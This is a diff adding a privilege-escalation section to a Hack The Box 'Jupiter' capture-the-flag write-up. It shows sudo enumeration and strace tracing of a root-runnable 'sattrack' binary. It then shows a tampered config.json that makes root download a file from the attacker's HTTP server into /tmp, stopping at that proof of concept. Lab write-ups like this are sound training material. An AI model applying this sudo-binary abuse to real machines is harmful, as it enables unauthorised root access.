@@ -3,7 +3,7 @@ layout: writeup
 category: HTB
 date: 2024-12-29
 comments: false
-tags: grafana subdomainenumeration webcrawling crawling burpsuite postgresql sqlinjection sqli remotecodeexecution rce reverseshell
+tags: grafana subdomainenumeration webcrawling crawling burpsuite postgresql sqlinjection sqli remotecodeexecution rce reverseshell jupyternotebook python sudoers strace
 ---
 
 <br />
@@ -329,7 +329,7 @@ PostgreSQL.2297639024  network-simulation.yml  shadow.data
 
 <br />
 
-The file `network-simulation.yml` immediately draws attention. `YAML` files are commonly used for configuration, but in many cases they’re also part of automated scheduled tasks—for example, as input to `crontabs` or simulation jobs.
+The file `network-simulation.yml` immediately draws attention. `YAML` files are commonly used for configuration, but in many cases they’re also part of automated scheduled tasks for example, as input to `crontabs` or simulation jobs.
 
 To check it, we run `pspy64`:
 
@@ -658,3 +658,248 @@ uid=1001(jovian) gid=1002(jovian) groups=1002(jovian),27(sudo),1001(science)
 ```
 
 <br />
+
+# Privilege Escalation: jovian -> root
+
+<br />
+
+Check jovian `sudoers` privileges:
+
+<br />
+
+```bash
+jovian@jupiter:/opt/solar-flares$ sudo -l
+Matching Defaults entries for jovian on jupiter:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jovian may run the following commands on jupiter:
+    (ALL) NOPASSWD: /usr/local/bin/sattrack
+```
+
+<br />
+
+He can runs `"sattrack"` as `root` without enter a password.
+
+But when we try to run it:
+
+<br />
+
+```bash
+jovian@jupiter:/opt/solar-flares$ sudo /usr/local/bin/sattrack
+Satellite Tracking System
+Configuration file has not been found. Please try again!
+```
+
+<br />
+
+It looks like we need a `config` file.
+
+So let's try to search `sattrack` path to find this file:
+
+<br />
+
+```bash
+jovian@jupiter:/opt/solar-flares$ find / -name "sattrack" -type d 2>/dev/null
+/usr/local/share/sattrack
+```
+
+<br />
+
+Go to the path and list:
+
+<br />
+
+```bash
+jovian@jupiter:/usr/local/share/sattrack$ ls
+config.json  earth.png  map.json
+```
+
+<br />
+
+### config.json:
+
+<br />
+
+This is really strange.
+
+Because when we run the program, it says that there isn’t a `config` file but in reality, there actually is one.
+
+So, to check what's going on, we run the binary again using strace:
+
+<br />
+
+```bash
+jovian@jupiter:/usr/local/share/sattrack$ strace /usr/local/bin/sattrack 
+execve("/usr/local/bin/sattrack", ["/usr/local/bin/sattrack"], 0x7ffefaa78f10 /* 21 vars */) = 0
+...[snip]...
+newfstatat(AT_FDCWD, "/tmp/config.json", 0x7ffeb8dab220, 0) = -1 ENOENT (No such file or directory)
+write(1, "Configuration file has not been "..., 57Configuration file has not been found. Please try again!
+) = 57
+getpid()                                = 3826
+exit_group(1)                           = ?
++++ exited with 1 +++
+```
+
+<br />
+
+As we can see, the program is searching on /tmp the `"config.json"` file that we see in the `sattrack` directory.
+
+We move this config file to `/tmp` and run the program again:
+
+<br />
+
+```bash
+jovian@jupiter:/usr/local/share/sattrack$ cp config.json /tmp
+jovian@jupiter:/usr/local/share/sattrack$ sudo /usr/local/bin/sattrack 
+Satellite Tracking System
+tleroot does not exist, creating it: /tmp/tle/
+Get:0 http://celestrak.org/NORAD/elements/weather.txt
+```
+
+<br />
+
+GG! Now we can run it without any problem.
+
+We can `analyze` the configuration file to `understand` its structure.
+
+<br />
+
+```json
+{
+	"tleroot": "/tmp/tle/",
+	"tlefile": "weather.txt",
+	"mapfile": "/usr/local/share/sattrack/map.json",
+	"texturefile": "/usr/local/share/sattrack/earth.png",
+	
+	"tlesources": [
+		"http://celestrak.org/NORAD/elements/weather.txt",
+		"http://celestrak.org/NORAD/elements/noaa.txt",
+		"http://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle"
+	],
+	
+	"updatePerdiod": 1000,
+	
+	"station": {
+		"name": "LORCA",
+		"lat": 37.6725,
+		"lon": -1.5863,
+		"hgt": 335.0
+	},
+	
+	"show": [
+	],
+	
+	"columns": [
+		"name",
+		"azel",
+		"dis",
+		"geo",
+		"tab",
+		"pos",
+		"vel"
+	]
+}
+```
+
+<br />
+
+
+There are two key components in this program:
+
+`tleroot` – the path where the program stores the content.
+
+`tlesources` – the files that are downloaded and placed into the tleroot path.
+
+<br />
+
+### Malicious config.json:
+
+<br />
+
+To test this, we are going to host a `"poc.txt"` file in a python server of our attacker machine, and and try to put into the `/tmp` path manipulating the `"config.json"` file:
+
+<br />
+
+```bash
+❯ echo "Testing a way to exploit this program" > poc.txt
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+<br />
+
+Config file manipulated:
+
+<br />
+
+```json
+{
+	"tleroot": "/tmp/",
+	"tlefile": "weather.txt",
+	"mapfile": "/usr/local/share/sattrack/map.json",
+	"texturefile": "/usr/local/share/sattrack/earth.png",
+	
+	"tlesources": [
+		"http://10.10.14.31/poc.txt"
+],
+	
+	"updatePerdiod": 1000,
+	
+	"station": {
+		"name": "LORCA",
+		"lat": 37.6725,
+		"lon": -1.5863,
+		"hgt": 335.0
+	},
+	
+	"show": [
+	],
+	
+	"columns": [
+		"name",
+		"azel",
+		"dis",
+		"geo",
+		"tab",
+		"pos",
+		"vel"
+	]
+}
+```
+
+<br />
+
+Run the program and...
+
+<br />
+
+We receive a GET:
+
+<br />
+
+```bash
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.10.11.216 - - [27/Mar/2025 22:41:00] "GET /poc.txt HTTP/1.1" 200 -
+```
+
+<br />
+
+```bash
+jovian@jupiter:/usr/local/share/sattrack$ sudo /usr/local/bin/sattrack
+Satellite Tracking System
+Get:0 http://10.10.14.31/poc.txt
+tlefile is not a valid file
+jovian@jupiter:/usr/local/share/sattrack$ ls -l /tmp/poc.txt
+-rw-r--r-- 1 root root 38 Mar 27 21:41 /tmp/poc.txt
+jovian@jupiter:/usr/local/share/sattrack$ cat /tmp/poc.txt 
+Testing a way to exploit this program
+```
+
+<br />
+
+We did it! We managed to get `root` to fetch the file from our `server` and drop it into `/tmp` with the same name.
+
+<br />
+
+
